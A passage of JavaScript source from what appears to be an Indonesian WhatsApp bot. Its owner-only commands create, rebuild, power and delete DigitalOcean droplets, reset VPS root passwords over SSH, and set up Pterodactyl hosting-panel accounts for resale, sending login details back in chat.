let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apidigitalocean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apidigitalocean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
client.sendMessage(m.chat, { text: textvps }, {quoted: loli});
} else {
reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

case 'cekdroplet': {
if (!isCreator) return reply(mess.owner)
let dropletId = args[0];
if (!dropletId) return reply('ID droplet belum diberikan!');
const getDropletInfo = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
const response = await fetch(apiUrl, {
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apidigitalocean}`
}
});
if (response.ok) {
const data = await response.json();
const droplet = data.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
const vpsRam = droplet.memory / 1024;
return {
dropletid: droplet.id,
username: droplet.name,
ip: ipAddress,
ram: `${vpsRam} GB`,
os: droplet.image.distribution,
cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
storage: droplet.disk,
status: droplet.status // Menambahkan status VPS
};
} else {
const errorData = await response.json();
return new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
}
} catch (err) {
reply('Terjadi kesalahan saat memeriksa detail droplet:', err.message);
return new Error('Terjadi kesalahan saat memeriksa detail droplet.');
}
};

getDropletInfo(dropletId)
.then((info) => {
let textku = `*DETAIL VPS KAMU*
Droplet ID: ${info.dropletid}
Hostname: ${info.username}
IPv4: ${info.ip}
Ram: ${info.ram}
OS: ${info.os}
CPU: ${info.cpu}
Storage: ${info.storage}
Status: ${info.status}`;
client.sendMessage(m.chat, { text: textku });
})
.catch((err) => {
reply(err);
client.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
});
break;
}

case 'gantipwvps': case "gantipasswordvps": {
if (!isCreator) return reply(mess.owner)
 let t = text.split(',');
 if (t.length < 2) return reply(`*Format salah!*\nPenggunaan : ${prefix+command} ipvps,passwordlama,paswordbaru`)
 
 let ipvps = t[0];
 let passwd = t[1];
 let pw = t[2];
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };

 // Gunakan string terenkripsi di kode Anda
 const commandPanel = `${global.bash}`
 const conn = new Client();
 
 conn.on('ready', () => {
 isSuccess = true; // Set flag menjadi true jika koneksi berhasil
 reply('*UBAH PASSWORD VPS DIMULAI*');
 
 conn.exec(commandPanel, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Stream closed with code ' + code + ' and signal ' + signal);
 reply(`*BERIKUT DATA VPS ANDA*\n\n*IP VPS* : ${ipvps}\n*PW VPS* : ${pw}\n\n*NOTES:*\nSIMPAN DATA VPS SECARA BAIK² JANGAN SAMPAI HILANG TERIMAKASIH🥰`)
 conn.end();
 }).on('data', (data) => {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('8\n');
 stream.write(`${pw}\n`)
 stream.write(`${pw}\n`);
 console.log('STDOUT: ' + data);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
 reply('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
break

//================================================================================

case "sisadroplet": {
if (!isCreator) return reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apidigitalocean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apidigitalocean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletdigital() {
try {
if (!isCreator) return reply(mess.owner)

const dropletInfo = await getDropletInfo();
reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletdigital();
}
break

//================================================================================

case "deldroplet": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apidigitalocean}`
}
});

if (response.ok) {
reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

case 'changeapido' :
if (!isCreator) return reply(mess.owner)
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
global.apidigitalocean = `${text}`
reply('Succesfully Change Token Api Do')
} else {
return reply(`*format salah*\nContoh: ${prefix}changeapido *<TOKEN-API>*`)
}
break

case 'checkdo': {
if (!isCreator) return reply(mess.owner)

const axios = require('axios');
const DO_API_TOKEN = global.apidigitalocean; // Ganti dengan API token DigitalOcean Anda

// Fungsi untuk mengambil informasi akun DigitalOcean
async function checkDOInfo() {
try {
// API untuk mendapatkan informasi pengguna
const accountInfo = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
'Authorization': `Bearer ${DO_API_TOKEN}`
}
});

// API untuk mendapatkan informasi droplet
const dropletsInfo = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
'Authorization': `Bearer ${DO_API_TOKEN}`
}
});

// Data Akun
const account = accountInfo.data.account;
const droplets = dropletsInfo.data.droplets;

// Hitung jumlah droplet
const dropletCount = droplets.length;

// Buat informasi tentang setiap droplet
let dropletDetails = '';
droplets.forEach((droplet, index) => {
dropletDetails += `
${index + 1}. Name: ${droplet.name}
Status: ${droplet.status}
Memory: ${droplet.memory} MB
Disk: ${droplet.disk} GB
Region: ${droplet.region.slug}
IP: ${droplet.networks.v4[0]?.ip_address || 'N/A'}\n`;
});

// Pesan hasil
return `
🖥️ *DigitalOcean Account Info*
Name: ${account.name || 'N/A'}
Email: ${account.email || 'N/A'}
Email Verified: ${account.email_verified ? 'Yes' : 'No'}
Droplets Used: ${dropletCount}

🌐 *Droplet Details*:
${dropletDetails || 'No droplets found.'}`;
} catch (error) {
console.error('Error fetching DO info:', error.message);
return '⚠️ Gagal mengambil informasi akun DigitalOcean. Pastikan API token benar.';
}
}

// Jalankan fungsi dan kirim hasilnya
checkDOInfo().then(info => {
reply(info); // Sesuaikan fungsi pengiriman pesan sesuai bot Anda
});
}
break;

//================================================================================

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("hostname"))
    await sleep(1000)
    let images
    let region = "nyc3"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "nyc3"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apidigitalocean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apidigitalocean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await client.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

case "createvps": {
  if (!isCreator) return reply(mess.owner)

  const args = text.split(' '); // Memisahkan argumen berdasarkan spasi
  const hostname = args[0]; // Nama host
  const sizeOption = args[1]; // Ukuran VPS
  const osOption = args[2] || "ubuntu"; // Default: Ubuntu
  const osVersionOption = args[3] || "20-04"; // Default: Ubuntu 20.04
  const regionOption = args[4] || "sgp1"; // Default: Singapore

  // Validasi argumen
  if (!hostname || !sizeOption) {
    return reply(
      `*Format argumen salah!*\nCONTOH: ${prefix+command} namahostmu vps16g4c ubuntu 20-04 sgp1\n\n` +
      `*Opsi yang tersedia:*\n` +
      `- Ukuran VPS: vps1g1c, vps2g1c, vps2g2c, vps4g2c, vps8g4c, vps16g4c\n` +
      `- OS: ubuntu, debian, centos, fedora\n` +
      `- Versi OS:\n  Ubuntu: 20-04, 22-04\n  Debian: 10, 11\n  CentOS: 7, 8\n  Fedora: 34, 35\n` +
      `- Region: sgp1, nyc3, ams3, lon1, fra1, sfo1, blr1, tor1`
    );
  }

  // Peta OS dan Versi
  const osMap = {
    ubuntu: { '20-04': 'ubuntu-20-04-x64', '22-04': 'ubuntu-22-04-x64' },
    debian: { '10': 'debian-10-x64', '11': 'debian-11-x64' },
    centos: { '8': 'centos-8-x64', '7': 'centos-7-x64' },
    fedora: { '34': 'fedora-34-x64', '35': 'fedora-35-x64' },
  };

  if (!osMap[osOption]) {
    return reply(`*OS tidak valid!*\nOS yang tersedia: ubuntu, debian, centos, fedora.`);
  }
  if (!osMap[osOption][osVersionOption]) {
    return reply(
      `*Versi OS tidak valid!*\nVersi yang tersedia untuk ${osOption}: ${Object.keys(osMap[osOption]).join(', ')}`
    );
  }

  // Peta Ukuran
  const sizeMap = {
    vps1g1c: 's-1vcpu-1gb',
    vps2g1c: 's-1vcpu-2gb',
    vps2g2c: 's-2vcpu-2gb',
    vps4g2c: 's-2vcpu-4gb',
    vps8g4c: 's-4vcpu-8gb',
    vps16g4c: 's-4vcpu-16gb-amd',
  };

  if (!sizeMap[sizeOption]) {
    return reply(`*Ukuran VPS tidak valid!*\nUkuran yang tersedia: ${Object.keys(sizeMap).join(', ')}`);
  }

  // Peta Region
  const regionMap = {
    sgp1: 'Singapore (SGP1)',
    nyc3: 'New York (NYC3)',
    ams3: 'Amsterdam (AMS3)',
    lon1: 'London (LON1)',
    fra1: 'Frankfurt (FRA1)',
    sfo1: 'San Francisco (SFO1)',
    blr1: 'Bangalore (BLR1)',
    tor1: 'Toronto (TOR1)',
  };

  if (!regionMap[regionOption]) {
    return reply(`*Region tidak valid!*\nRegion yang tersedia: ${Object.keys(regionMap).join(', ')}`);
  }

  try {
    // Data untuk membuat droplet
    let dropletData = {
      name: hostname.toLowerCase(),
      region: regionOption,
      size: sizeMap[sizeOption],
      image: osMap[osOption][osVersionOption],
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T'],
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: 'Bearer ' + global.apidigitalocean,
      },
      body: JSON.stringify(dropletData),
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      await reply(`Memproses pembuatan VPS...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          Authorization: 'Bearer ' + global.apidigitalocean,
        },
      });

      let dropletDetails = await dropletResponse.json();
      let ipVPS =
        dropletDetails.droplet.networks.v4 && dropletDetails.droplet.networks.v4.length > 0
          ? dropletDetails.droplet.networks.v4[0].ip_address
          : 'Tidak ada alamat IP yang tersedia';

      let messageText = `VPS berhasil dibuat!\n\n`;
      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}`;

      await client.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err.message}`);
  }
}
break;

case 'turnon': {
  if (!isCreator) return reply(mess.owner)
  
  let dropletId = args[0];
  if (!dropletId) return reply('❌ ID droplet belum diberikan!');
  
  const accounts = [global.apidigitalocean];

  (async () => {
    for (let i = 0; i < accounts.length; i++) {
      try {
        const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${accounts[i]}`
          },
          body: JSON.stringify({ type: 'power_on' })
        });

        if (response.ok) {
          return reply(`✅ VPS berhasil dihidupkan dengan akun ke-${i + 1}!`);
        }
      } catch (err) {
        continue;
      }
    }
    reply('❌ Gagal menghidupkan VPS. Droplet mungkin tidak ditemukan di semua akun.');
  })();
  break;
}

case 'turnoff': {
  if (!isCreator) return reply(mess.owner)
  
  let dropletId = args[0];
  if (!dropletId) return reply('❌ ID droplet belum diberikan!');
  
  const accounts = [global.apidigitalocean];

  (async () => {
    for (let i = 0; i < accounts.length; i++) {
      try {
        const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${accounts[i]}`
          },
          body: JSON.stringify({ type: 'power_off' })
        });

        if (response.ok) {
          return reply(`✅ VPS berhasil dimatikan dengan akun ke-${i + 1}!`);
        }
      } catch (err) {
        continue;
      }
    }
    reply('❌ Gagal mematikan VPS. Droplet mungkin tidak ditemukan di semua akun.');
  })();
  break;
}

case "cvps": {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(example("hostname"));
    global.hostname = text.toLowerCase();
let teks = `Silahkan Pilih Ram Vps Yang Mau Dicreate`
const sections = [{
	    	title: '𝑫𝒂𝒏𝒏𝒚 </> 𝑺𝒖𝒑𝒆𝒓𝒊𝒐𝒓',
	    	highlight_label: "🎭꙳͙͡༑ᐧ ̬𝑻͢𝒉𝒂͜͡𝒏 𝑺𝒆̤𝒗͡𝒆𝒏͡ ̬꙳͙͡༑ᐧ〽️",
	    	rows: [{
	    		title: "VPS 1GB CORE 1",
	    		description: "Created Ram 1GB CORE 1",
	    		id: ".1gb1c"
	    	}]
	    }, {	    	
	    	rows: [{
	    		title: "VPS 2GB CORE 2", description: "Created Ram 2GB CORE 2", id: ".2gb2c"
	    	}, {
	    		title: "VPS 4GB CORE 2", description: "Created Ram 4GB CORE 2", id: ".4gb2c"
	    	},
	    	{
	    		title: "VPS 8GB CORE 4", description: "Created Ram 8GB CORE 4", id: ".8gb4c"
	    	},
	    	{
	    		title: "VPS 16GB CORE 4", description: "Created Ram 16GB CORE 4", id: ".16gb4c"
	    	}]
	    }]
	    
	    let listMessage = {
	    	title: "options",
	    	sections
	    }

const Vyunicos = [
{ buttonId: '.menu', buttonText: { displayText: '𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦', }, type: 1, nativeFlowInfo: { name: 'single_select', paramsJson: JSON.stringify(listMessage), }, viewOnce: true, }
                ]
                
                client.sendMessage(m.chat, {
                	    image: fs.readFileSync("./source/media/Xyz.jpg"),
                	    caption: teks,
                    	footer: global.footer,
                    	buttons: Vyunicos,
                	    headerType: 1,
                	    viewOnce: true,
                    }, { quoted: loli })
}
break  

case '1gb1c':
case '2gb1c':
case '2gb2c':
case '4gb2c':
case '8gb4c':
case '16gb4c': {
if (!isCreator) return reply(mess.owner)
    let size;

    // Pilih konfigurasi VPS berdasarkan tombol
    switch (command) {
        case '1gb1c':
            size = 's-1vcpu-1gb';
            break;
        case '2gb1c':
            size = 's-1vcpu-2gb';
            break;
        case '2gb2c':
            size = 's-2vcpu-2gb';
            break;
        case '4gb2c':
            size = 's-2vcpu-4gb';
            break;
        case '8gb4c':
            size = 's-4vcpu-8gb';
            break;
        default:
            size = 's-4vcpu-16gb-amd';
    }

    // Data untuk pembuatan VPS
    let dropletData = {
        name: global.hostname,
        region: 'nyc3', // Wilayah
        size: size,
        image: 'ubuntu-20-04-x64',
        ssh_keys: null,
        backups: false,
        ipv6: true,
        user_data: null,
        private_networking: null,
        volumes: null,
        tags: ['DannyS8X']
    };

    try {
        // Generate password secara acak
        let password = await generateRandomPassword();
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        // Request ke API DigitalOcean
        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer ' + global.apidigitalocean
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletId = responseData.droplet.id;

            // Tunggu VPS selesai dibuat
            await reply('Sedang membuat VPS, mohon tunggu...');
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Ambil informasi VPS yang telah dibuat
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ' + global.apidigitalocean
                }
            });

            let dropletDetails = await dropletResponse.json();
            let ipVPS = dropletDetails.droplet.networks.v4[0]?.ip_address || 'IP tidak ditemukan';

            // Kirim detail VPS ke pengguna
            let messageText = `✅ VPS Berhasil Dibuat!\n\n`;
            messageText += `🌐 Hostname: ${global.hostname}\n`;
            messageText += `💻 Konfigurasi: ${size}\n`;
            messageText += `🔑 Password: ${password}\n`;
            messageText += `🌍 IP VPS: ${ipVPS}\n`;

            await client.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(responseData.message || 'Kesalahan tidak diketahui.');
        }
    } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan: ${err.message}`);
    }
    break;
}

case 'linklog': {
if (!isCreator) return reply(mess.owner)
let linklognya = `*halo @${m.pushName} 👋*

*LINK LOGIN PANEL*

*Link Login*
${global.domain}

Apikey
${global.apikey}

Capikey
${global.capikey}

▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(linklognya)
}
break

case 'linklog-v2': {
if (!isCreator) return reply(mess.owner)
let linklog2 = `*halo @${m.pushName} 👋*

*LINK LOGIN PANEL*

*Link Login*
${global.domainV2}

Apikey
${global.apikeyV2}

Capikey
${global.capikeyV2}

▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(linklog2)
}
break

//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
if (!text) return reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Succesfully Create Server Panel*\nData akun sudah dikirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Succes Create Akun Panel*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await client.sendMessage(orang, {text: teks}, {quoted: loli})
delete global.panel
}
break

case "cpanel": {
if (!isCreator && !isSeller) return reply(mess.seller)
if (!q) return reply(example("username"));
    global.panel = [text.toLowerCase()]
let teks = `Pilih Ram Panel Dibawah ini`
const sections = [{
	    	title: '𝑫𝒂𝒏𝒏𝒚 </> 𝑺𝒖𝒑𝒆𝒓𝒊𝒐𝒓',
	    	highlight_label: "🎭꙳͙͡༑ᐧ ̬𝑻͢𝒉𝒂͜͡𝒏 𝑺𝒆̤𝒗͡𝒆𝒏͡ ̬꙳͙͡༑ᐧ〽️",
	    	rows: [{
	    		title: "1GB", description: "Create Ram 1GB", id: ".1gb1"
	    	}]
	    }, {	    	
	    	rows: [{
	    		title: "2GB", description: "Create Ram 2GB", id: ".2gb1"
	    	}, {
	    		title: "3GB", description: "Create Ram 3GB", id: ".3gb1"
	    	},
	    	{
	    		title: "4GB", description: "Create Ram 4GB", id: ".4gb1"
	    	},
	    	{
	    		title: "5GB", description: "Create Ram 5GB", id: ".5gb1"
	    	},
	    	{
	    		title: "6GB", description: "Create Ram 6GB", id: ".6gb1"
	    	},
	    	{
	    		title: "7GB", description: "Create Ram 7GB", id: ".7gb1"
	    	},
	    	{
	    		title: "8GB", description: "Create Ram 8GB", id: ".8gb1"
	    	},
	    	{
	    		title: "9GB", description: "Create Ram 9GB", id: ".9gb1"
	    	},
	    	{
	    		title: "10GB", description: "Create Ram 10GB", id: ".10gb1"
	    	},
	    	{
	    		title: "UNLIMITED", description: "Create Ram Unlimited", id: ".unli1"
	    	}]
	    }]
	    
	    let listMessage = {
	    	title: "options",
	    	sections
	    }

const Vyunicos = [
{ buttonId: '.menu', buttonText: { displayText: '𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦', }, type: 1, nativeFlowInfo: { name: 'single_select', paramsJson: JSON.stringify(listMessage), }, viewOnce: true, }
                ]
                
                client.sendMessage(m.chat, {
                	    image: fs.readFileSync("./source/media/Xyz.jpg"),
                	    caption: teks,
                    	footer: global.footer,
                    	buttons: Vyunicos,
                	    headerType: 1,
                	    viewOnce: true,
                    }, { quoted: loli })
}
break  

case "addpanel": case "buatpanel": {
if (!isCreator && !isSeller) return reply(mess.seller)
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama"))
global.panel = [text.toLowerCase()]
let imgnya = await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/5xwxv6.jpg' }}, { upload: client.waUploadToServer })
global.panel = [text.toLowerCase()]
const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "Silahkan Pilih Ram Server Panel Yang Tersedia Di Bawah Ini"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *1GB*
* CPU Server *40%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 1GB\",\"title\":\"Create\",\"id\":\".cp1gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *2GB*
* CPU Server *60%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 2GB\",\"title\":\"Create\",\"id\":\".cp2gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *3GB*
* CPU Server *80%*`
              }),
